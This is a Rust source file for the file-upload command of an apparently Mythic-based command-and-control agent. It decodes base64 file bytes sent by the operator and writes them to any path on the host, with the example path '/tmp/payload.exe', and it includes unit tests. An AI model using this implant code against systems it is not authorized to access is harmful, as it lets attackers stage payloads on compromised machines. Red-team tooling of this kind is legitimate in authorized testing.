//! File upload (Mythic → agent).
//!
//! Receives base64-encoded file bytes in task parameters,
//! decodes them, and writes to the target path.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/tmp/payload.exe",
//!     "file_bytes": "<base64_encoded_contents>",
//!     "host": "optional-hostname"
//! }
//! ```

use std::path::Path;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::common::base64::decode as decode_b64;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    /// Absolute path where the file should be written.
    path: String,
    /// Base64-encoded file contents.
    file_bytes: String,
    #[serde(default)]
    #[allow(dead_code)]
    host: Option<String>,
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("upload parse error: {e}")),
    };

    // 1. Decode base64
    let data = match decode_b64(&params.file_bytes) {
        Ok(d) => d,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };

    // 2. Create parent directories if needed
    let path = Path::new(&params.path);
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            if let Err(e) = std::fs::create_dir_all(parent) {
                return TaskResponse::failed(
                    task.id,
                    &format!("create parent dir {} failed: {e}", parent.display()),
                );
            }
        }
    }

    // 3. Write file
    match std::fs::write(path, &data) {
        Ok(_) => {
            info!("[upload] wrote {} bytes to {}", data.len(), path.display());
            TaskResponse {
                task_id: task.id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: Some(format!("uploaded {} bytes to {}", data.len(), path.display())),
                ..Default::default()
            }
        }
        Err(e) => TaskResponse::failed(task.id, &format!("write {} failed: {e}", path.display())),
    }
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upload_and_verify() {
        use std::io::Read;

        let original = b"nanaz upload test payload\0with\0nulls";
        let encoded = crate::common::base64::encode(original);

        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push("nanaz_up_test.bin");
            p
        };

        let task = TaskMessage {
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_bytes": encoded,
            })
            .to_string(),
            ..Default::default()
        };

        let resp = handle(&task);
        assert!(resp.completed == Some(true));

        // Verify file was written correctly
        let mut f = std::fs::File::open(&tmp_path).unwrap();
        let mut buf = Vec::new();
        f.read_to_end(&mut buf).unwrap();
        let _ = std::fs::remove_file(&tmp_path);

        assert_eq!(buf, original);
    }

    #[test]
    fn test_upload_invalid_base64() {
        let task = TaskMessage {
            command: "upload".into(),
            parameters: r#"{"path": "/tmp/test", "file_bytes": "!!!not-valid-base64!!!"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert!(resp.status.as_deref() == Some("error"));
    }
}
